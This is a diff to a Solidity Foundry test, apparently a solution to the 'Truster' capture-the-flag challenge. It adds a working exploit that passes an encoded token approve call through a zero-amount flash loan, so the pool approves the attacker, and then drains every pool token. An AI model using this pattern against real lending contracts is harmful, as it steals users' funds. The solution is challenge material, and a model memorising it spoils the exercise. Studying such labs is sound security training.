@@ -41,7 +41,10 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        bytes memory data = abi.encodeWithSelector(dvt.approve.selector, address(attacker), TOKENS_IN_POOL);
+        vm.startPrank(attacker);
+        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data);
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
         /**
          * EXPLOIT END *
          */
